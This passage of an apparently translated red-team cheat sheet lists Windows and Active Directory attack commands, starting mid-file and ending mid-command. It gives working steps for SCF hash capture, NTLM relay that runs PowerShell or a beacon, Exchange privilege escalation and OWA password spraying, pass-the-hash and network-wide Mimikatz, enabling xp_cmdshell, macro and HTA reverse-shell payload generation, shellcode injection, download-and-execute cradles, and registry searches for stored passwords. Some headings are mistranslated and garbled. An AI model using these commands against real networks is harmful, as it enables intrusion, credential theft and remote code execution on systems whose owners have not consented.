@m0chan.scf</span><br><span class="line"></span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.2\Share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><h2 id="3-5-NTLM-Relay"><a href="#3-5-NTLM-Relay" class="headerlink" title="3.5 NTLM-Relay"></a>3.5 NTLM-Relay</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Good article explaining differences between NTLM/Net-NTLMV1&amp;V2</span><br><span class="line"></span><br><span class="line">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</span><br><span class="line"></span><br><span class="line">TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</span><br><span class="line"></span><br><span class="line">You CAN perform Pass-The-Hash attacks with NTLM hashes.</span><br><span class="line">You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.</span><br><span class="line"></span><br><span class="line">PS: You CANNOT relay a hash back to itself.</span><br><span class="line">PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt</span><br><span class="line"></span><br><span class="line">This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.</span><br><span class="line"></span><br><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br><span class="line">ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)</span><br><span class="line"></span><br><span class="line">How about we execute a command instead.</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd</span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</span><br></pre></td></tr></table></figure><h2 id="3-6-私下交易"><a href="#3-6-私下交易" class="headerlink" title="3.6 私下交易"></a>3.6 私下交易</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><span class="line"></span><br><span class="line">Combine privxchange.py and ntlmrelayx</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE</span><br><span class="line"></span><br><span class="line">python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</span><br></pre></td></tr></table></figure><h2 id="3-7-Exchange-Password-Spray"><a href="#3-7-Exchange-Password-Spray" class="headerlink" title="3.7 Exchange Password Spray"></a>3.7 Exchange Password Spray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#https://github.com/sensepost/ruler</span><br><span class="line"></span><br><span class="line">./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</span><br></pre></td></tr></table></figure><h2 id="3-8-ExchangeRelayX"><a href="#3-8-ExchangeRelayX" class="headerlink" title="3.8 ExchangeRelayX"></a>3.8 ExchangeRelayX</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/quickbreach/ExchangeRelayX</span><br><span class="line"></span><br><span class="line">An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exchangeRelayx.py -t https://mail.quickbreach.com</span><br></pre></td></tr></table></figure><h2 id="3-9-Exchange-Mailbox-Post-Compromise"><a href="#3-9-Exchange-Mailbox-Post-Compromise" class="headerlink" title="3.9 Exchange Mailbox Post-Compromise"></a>3.9 Exchange Mailbox Post-Compromise</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Enumerate GlobalAddressList</span><br><span class="line"></span><br><span class="line">Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019</span><br><span class="line"></span><br><span class="line">Enumerate AD Usernames</span><br><span class="line"></span><br><span class="line">Get-ADUsernameFromEWS -Emaillist .\users.txt</span><br><span class="line"></span><br><span class="line">Enumerate Mailbox Folders</span><br><span class="line"></span><br><span class="line">Get-MailboxFolders -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials Stored in Emails</span><br><span class="line"></span><br><span class="line">Invoke-SelfSearch -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin</span><br><span class="line"></span><br><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</span><br></pre></td></tr></table></figure><h2 id="3-10-CrackMapExec"><a href="#3-10-CrackMapExec" class="headerlink" title="3.10 CrackMapExec"></a>3.10 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CrackMapExec is installed on Kali or get Windows Binary from Github.</span><br><span class="line"></span><br><span class="line">Has 3 Execution Methods</span><br><span class="line">crackmapexec smb &lt;- Creating and Running a Service over SMB</span><br><span class="line">crackmapexec wmi &lt;- Executes command over WMI</span><br><span class="line">crackmapexec at &lt;- Schedules Task with Task Scheduler</span><br><span class="line"></span><br><span class="line">Can execute plain commands with -X flag i/e </span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 -x whoami</span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; </span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-pol</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --shares</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can also PTH with CME</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e</span><br><span class="line"></span><br><span class="line">cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS</span><br><span class="line"></span><br><span class="line">Dump Local SAM hashes</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --sam</span><br><span class="line"></span><br><span class="line">Running Mimikatz </span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz</span><br><span class="line"></span><br><span class="line">^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin</span><br><span class="line"></span><br><span class="line">Enum AV Products</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts</span><br></pre></td></tr></table></figure><h2 id="3-11-邮件狙击手"><a href="#3-11-邮件狙击手" class="headerlink" title="3.11 邮件狙击手"></a>3.11 邮件狙击手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019</span><br><span class="line"></span><br><span class="line">[*] Now spraying the OWA portal at https://m0chanAD.local/owa/</span><br><span class="line"></span><br><span class="line">[*] SUCCESS! User:m0chan:Summer2019</span><br><span class="line"></span><br><span class="line">Lmao, you really think Id use the pass Summer2019?</span><br></pre></td></tr></table></figure><h2 id="3-12-Kerberos-Stuff"><a href="#3-12-Kerberos-Stuff" class="headerlink" title="3.12 Kerberos Stuff"></a>3.12 Kerberos Stuff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></pre></td></tr></table></figure><h2 id="3-13-MSSQL利用（PowerUpSQL）"><a href="#3-13-MSSQL利用（PowerUpSQL）" class="headerlink" title="3.13 MSSQL利用（PowerUpSQL）"></a>3.13 MSSQL利用（PowerUpSQL）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/NetSPI/PowerUpSQL</span><br><span class="line"></span><br><span class="line">#View SQL Instances</span><br><span class="line">Get-SQLInstanceDomain [| Get-SQLServerInfo]</span><br><span class="line"></span><br><span class="line">#Login in with Domain Account</span><br><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line"></span><br><span class="line">#Login in with Default Password</span><br><span class="line">Get-SQLServerDefaultLoginPw</span><br><span class="line"></span><br><span class="line">#List DB, Tables &amp; Columns</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLDatabase</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;</span><br><span class="line"></span><br><span class="line">#Search Column Names for Word</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10</span><br><span class="line"></span><br><span class="line">#Try to Execute Commands (RCE)</span><br><span class="line"></span><br><span class="line">Invoke-SQLOSCmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Enable XP_CMDShell Process</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">xp_cmdshell &apos;&lt;cmd&gt;&apos;</span><br><span class="line">go</span><br></pre></td></tr></table></figure><h2 id="3-14-Malicious-Macro-with-MSBuild"><a href="#3-14-Malicious-Macro-with-MSBuild" class="headerlink" title="3.14 Malicious Macro with MSBuild"></a>3.14 Malicious Macro with MSBuild</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><span class="line"></span><br><span class="line">#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a PowerShell MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Custom MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Kill Date</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Environmental Keying</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</span><br></pre></td></tr></table></figure><h2 id="3-15-WeirdHTA-Undetectable-HTA"><a href="#3-15-WeirdHTA-Undetectable-HTA" class="headerlink" title="3.15 WeirdHTA - Undetectable HTA"></a>3.15 WeirdHTA - Undetectable HTA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/felamos/weirdhta</span><br><span class="line"></span><br><span class="line">python3 --help</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command)</span><br></pre></td></tr></table></figure><h2 id="3-16-EvilWinRM"><a href="#3-16-EvilWinRM" class="headerlink" title="3.16 EvilWinRM"></a>3.16 EvilWinRM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Hackplayers/evil-winrm</span><br><span class="line"></span><br><span class="line">Ultimate Shell for WinRM Connections</span><br><span class="line"></span><br><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]</span><br><span class="line">    -S, --ssl                        Enable SSL</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path</span><br><span class="line">    -e, --executables EXES_PATH      C# executables local path</span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default /wsman)</span><br><span class="line">    -u, --user USER                  Username (required)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -h, --help                       Display this help message</span><br></pre></td></tr></table></figure><p>3.17 GetVulnerableGPO</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gpoguy/GetVulnerableGPO</span><br><span class="line"></span><br><span class="line">PowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</span><br></pre></td></tr></table></figure><p>3.18 Invoke-PSImage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/peewpw/Invoke-PSImage</span><br><span class="line"></span><br><span class="line">Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute</span><br><span class="line"></span><br><span class="line">Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.</span><br><span class="line"></span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure><h2 id="3-17-Meterpreter-Donut-Shellcode注入-NET"><a href="#3-17-Meterpreter-Donut-Shellcode注入-NET" class="headerlink" title="3.17 Meterpreter + Donut-Shellcode注入.NET"></a>3.17 Meterpreter + Donut-Shellcode注入.NET</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><span class="line"></span><br><span class="line">A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!</span><br><span class="line"></span><br><span class="line">donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin</span><br><span class="line"></span><br><span class="line">use post/windows/manage/shellcode_inject</span><br><span class="line">set SHELLCODE /tmp/payload.bin</span><br><span class="line">set SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x04-特权提升"><a href="#0x04-特权提升" class="headerlink" title="0x04 特权提升"></a>0x04 特权提升</h1><blockquote><p>参考：<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p><p>运行此脚本：<a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p></blockquote><h2 id="4-1-基本命令"><a href="#4-1-基本命令" class="headerlink" title="4.1 基本命令"></a>4.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe</span><br><span class="line">net users</span><br><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">net localgroups</span><br><span class="line">echo %logonserver%</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netstat -an</span><br><span class="line">type C:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h2 id="4-2-PowerUp-ps1（有时是快速获胜）"><a href="#4-2-PowerUp-ps1（有时是快速获胜）" class="headerlink" title="4.2 PowerUp.ps1（有时是快速获胜）"></a>4.2 PowerUp.ps1（有时是快速获胜）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks</span><br></pre></td></tr></table></figure><h2 id="4-3-锐化"><a href="#4-3-锐化" class="headerlink" title="4.3 锐化"></a>4.3 锐化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpUp</span><br><span class="line"></span><br><span class="line">C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</span><br></pre></td></tr></table></figure><h2 id="4-4-如果是公元，引进猎狗犬…"><a href="#4-4-如果是公元，引进猎狗犬…" class="headerlink" title="4.4  如果是公元，引进猎狗犬…"></a>4.4  如果是公元，引进猎狗犬…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.ps1</span><br><span class="line">SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound</span><br><span class="line"></span><br><span class="line">IEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))</span><br><span class="line"></span><br><span class="line">Invoke-CollectionMethod All</span><br><span class="line"></span><br><span class="line">Import .zip to Bloodhound</span><br><span class="line"></span><br><span class="line">If you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works.</span><br></pre></td></tr></table></figure><h2 id="4-5-Bloodhound-Python"><a href="#4-5-Bloodhound-Python" class="headerlink" title="4.5 Bloodhound-Python"></a>4.5 Bloodhound-Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fox-it/BloodHound.py.git</span><br><span class="line">cd BloodHound.py/ &amp;&amp; pip install .</span><br><span class="line"></span><br><span class="line">bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</span><br></pre></td></tr></table></figure><h2 id="4-6-明文密码"><a href="#4-6-明文密码" class="headerlink" title="4.6 明文密码"></a>4.6 明文密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># SNMP Parameters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-7-查看已安装的软件"><a href="#4-7-查看已安装的软件" class="headerlink" title="4.7 查看已安装的软件"></a>4.7 查看已安装的软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br><span class="line">net start</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line">DRIVERQUERY</span><br><span class="line"></span><br><span class="line">dir /a &quot;C:\Program Files&quot;</span><br><span class="line">dir /a &quot;C:\Program Files (x86)&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line"></span><br><span class="line">Get-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTime</span><br><span class="line"></span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br></pre></td></tr></table></figure><h2 id="4-8-弱文件夹权限"><a href="#4-8-弱文件夹权限" class="headerlink" title="4.8 弱文件夹权限"></a>4.8 弱文件夹权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Full Permissions for &apos;Everyone&apos; on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line"></span><br><span class="line">Modify Permissions for Everyone on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr 